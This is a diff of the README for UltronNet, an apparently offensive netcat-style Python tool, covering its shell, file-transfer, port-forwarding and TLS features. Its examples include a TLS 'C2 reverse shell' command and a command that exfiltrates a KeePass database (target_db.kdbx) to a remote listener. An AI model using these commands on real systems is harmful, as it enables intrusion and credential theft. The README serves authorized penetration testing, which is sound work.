@@ -1,130 +1,132 @@
-# UltronNet v2.0 🛡️
+# UltronNet v2.1 🛡️
 
-**Advanced Network Swiss Army Knife** — Python 3.8+
+**Advanced Network Swiss Army Knife & Encrypted Transport Engine** — Python 3.8+
+
+[![Architecture: Modular Package](https://img.shields.io/badge/Architecture-Modular_Package-blue.svg)](ultronnet/)
+[![Platform: Linux / macOS / Windows](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-green.svg)]()
+[![License: Open-Source](https://img.shields.io/badge/License-MIT-orange.svg)]()
 
 ---
 
 ## ⚡ Features
 
-| # | Feature | Status |
-|---|---------|--------|
-| 1 | **TCP & UDP** Protocol Support | ✅ |
-| 2 | **SSL/TLS** Full Encryption (auto self-signed certs) | ✅ |
-| 3 | **Progress Bar** for file transfers (`tqdm`) | ✅ |
-| 4 | **Full PTY Shell** (interactive, like SSH) | ✅ Linux/macOS |
-| 5 | **IPv4 & IPv6** Auto-Detection | ✅ |
-| 6 | **Port Forwarding** Bidirectional | ✅ |
-| 7 | **Error Handling** & Auto-Reconnect | ✅ |
+| # | Feature | Capability | Status |
+|---|---------|------------|--------|
+| 1 | **Multi-Protocol Engine** | Native TCP & UDP socket operations with automatic IPv4/IPv6 resolution | ✅ |
+| 2 | **Transport Security** | SSL/TLS in-memory encryption with automated self-signed certificate generation | ✅ |
+| 3 | **Interactive PTY Shell** | Fully interactive POSIX PTY allocation (`pty.fork`, `termios` raw mode, `SIGWINCH` resize) | ✅ Linux/macOS |
+| 4 | **Pivoting & Tunnels** | High-performance bidirectional threaded TCP port forwarding | ✅ |
+| 5 | **File Transport** | Framed streaming file upload/download with dynamic progress tracking (`tqdm`) | ✅ |
+| 6 | **Network Resilience** | Graceful socket shutdown (`SHUT_RDWR`), timeout handling, and exponential backoff auto-reconnect | ✅ |
 
 ---
 
-## 📦 Installation
+## 📦 Installation & Setup
+
+Install UltronNet in editable development mode to register the `ultronnet` command system-wide:
 
 ```bash
-pip install -r requirements.txt
+git clone https://github.com/0xZiki/UltronNet.git
+cd UltronNet
+pip install -e . --break-system-packages
 ```
 
 ---
 
 ## 🚀 Usage
 
-```
-python UltronNet.py [OPTIONS]
+You can run UltronNet directly from anywhere in your terminal via the installed binary, or execute the root runner:
+
+```bash
+# Direct system command (recommended)
+ultronnet [OPTIONS]
+
+# Or via the root wrapper
+./UltronNet.py [OPTIONS]
 ```
 
-### Connection Options
+### Connection Flags
 | Flag | Description |
 |------|-------------|
 | `-t HOST` | Target host (default: `0.0.0.0`) |
 | `-p PORT` | Target port (default: `4444`) |
-| `-l` | Listen mode |
-| `--udp` | Use UDP instead of TCP |
-| `--ipv6` | Force IPv6 |
-| `--reconnect` | Auto-reconnect on failure (max 5 attempts) |
+| `-l` | Enable Listener mode |
+| `--udp` | Use UDP transport instead of TCP |
+| `--ipv6` | Force IPv6 address resolution |
+| `--reconnect` | Auto-reconnect on socket failure (max 5 attempts with backoff) |
 
 ### Operation Modes
 | Flag | Description |
 |------|-------------|
 | `-c` | Interactive command shell |
-| `--pty` | Full PTY shell (Linux/macOS) |
-| `-e "CMD"` | Execute command on connection |
-| `-u PATH` | Save received file to PATH |
-| `--send-file PATH` | Send file to server |
-| `--forward HOST:PORT` | Port forwarding |
+| `--pty` | Full POSIX PTY shell (Tab completion, signals, vim support) |
+| `-e "CMD"` | Execute command upon connection and pipe output |
+| `-u PATH` | Receive and save inbound file to target PATH |
+| `--send-file PATH` | Stream and upload local file to remote listener |
+| `--forward HOST:PORT` | Spawn bidirectional threaded port forwarding relay |
 
-### SSL/TLS
+### Cryptographic Security (SSL/TLS)
 | Flag | Description |
 |------|-------------|
-| `--ssl` | Enable encryption |
-| `--cert FILE` | Custom certificate (PEM) |
-| `--key FILE` | Custom private key (PEM) |
+| `--ssl` | Enforce full SSL/TLS encryption (auto-generates in-memory self-signed cert if none provided) |
+| `--cert FILE` | Path to custom PEM certificate |
+| `--key FILE` | Path to custom private key |
 
 ---
 
-## 💡 Examples
+## 💡 Practical Examples
 
 ```bash
-# TCP command shell (server)
-ultronNet -t 0.0.0.0 -p 4444 -l -c
+# 1. Spawn a full interactive PTY listener
+ultronnet -l -p 4444 --pty
 
-# TCP connect (client)
-ultronNet -t 192.168.1.10 -p 4444
+# 2. Encrypted TLS C2 reverse shell
+ultronnet -t 192.168.1.50 -p 4444 -c --ssl
 
-# Full PTY shell (interactive)
-ultronNet -t 0.0.0.0 -p 4444 -l --pty
+# 3. Bidirectional Port Forwarding (8080 local -> 192.168.1.10:80)
+ultronnet -l -p 8080 --forward 192.168.1.10:80
 
-# SSL encrypted shell
-ultronNet -t 0.0.0.0 -p 4444 -l -c --ssl
+# 4. Stream exfiltrate file with progress tracking
+# On Receiver:
+ultronnet -l -p 9000 -u received_db.kdbx
+# On Sender:
+ultronnet -t 10.10.10.5 -p 9000 --send-file target_db.kdbx
 
-# Upload file (server side)
-ultronNet -t 0.0.0.0 -p 4444 -l -u /tmp/received.bin
-
-# Send file (client side)
-ultronNet -t 192.168.1.10 -p 4444 --send-file secret.txt
-
-# UDP listener
-ultronNet -t 0.0.0.0 -p 4444 -l --udp
-
-# IPv6 shell
-ultronNet -t "::" -p 4444 -l --ipv6 -c
-
-# Port forwarding: 8080 → 192.168.1.10:80
-ultronNet -t 0.0.0.0 -p 8080 -l --forward 192.168.1.10:80
-
-# Auto-reconnect client
-ultronNet -t 192.168.1.10 -p 4444 --reconnect
-
-# Verbose / debug logging
-ultronNet -t 0.0.0.0 -p 4444 -l -c -v
+# 5. Resilient UDP listener
+ultronnet -l -p 5353 --udp
 ```
 
 ---
 
-## 🏗️ Architecture
+## 🏗️ Modular Architecture (v2.1)
 
-```
-UltronNet.py
-├── UltronConfig        ← All constants & defaults
-├── CryptoManager       ← SSL/TLS context + self-signed cert generation
-├── ProgressTracker     ← File transfer progress bar (tqdm or fallback)
-├── PortForwarder       ← Bidirectional TCP port forwarding
-├── PTYHandler          ← Full interactive PTY shell
-├── NetCat (core)       ← Main engine
-│   ├── _connect()      ← TCP/UDP client with reconnect
-│   ├── _listen()       ← TCP/UDP server (multi-threaded)
-│   ├── _handle()       ← Connection dispatcher
-│   ├── _handle_execute()
-│   ├── _handle_upload()    ← File receive with progress
-│   ├── _send_file()        ← File send with progress
-│   ├── _handle_command_shell()
-│   ├── _handle_relay()
-│   └── _start_forwarder()
-└── main()              ← CLI argument parsing
+```text
+UltronNet/
+├── UltronNet.py              ← Top-level standalone executable runner
+├── setup.py                  ← Package definition & console_scripts entrypoint
+├── docs/
+│   └── UltronNet-Interview-Dossier.md ← Exhaustive technical & syscall retention dossier
+└── ultronnet/                ← Core modular package
+    ├── config.py             ← Configuration dataclass & singleton defaults
+    ├── logging_setup.py      ← Thread-safe logging configuration
+    ├── core/                 ← Foundational network primitives
+    │   ├── socket_utils.py   ← detect_af, safe_close (SHUT_RDWR), recv_exactly
+    │   └── engine.py         ← Main NetCat connection lifecycle & dispatch
+    ├── crypto/               ← Cryptographic layer
+    │   └── manager.py        ← CryptoManager & dynamic in-memory X.509 cert generation
+    ├── features/             ← Modular operational capabilities
+    │   ├── pty_handler.py    ← POSIX openpty, termios raw-mode & signals
+    │   ├── port_forwarder.py ← Multithreaded cross-socket relay piping
+    │   ├── file_transfer.py  ← Chunked framing & progress tracker (tqdm fallback)
+    │   ├── executor.py       ← Subprocess execution handlers
+    │   └── shell.py          ← Command shell loop & dumb-shell dispatch
+    └── cli/                  ← User interface & argument orchestration
+        └── parser.py         ← build_parser & validation routines
 ```
 
 ---
 
 ## ⚠️ Legal Disclaimer
 
-> This tool is intended for **authorized penetration testing and educational purposes only**.  
-> Unauthorized use against systems you do not own is illegal.
+> This tool is developed for **authorized penetration testing, red teaming operations, and educational research only**.  
+> Unauthorized use against target systems without explicit prior written consent is strictly prohibited.
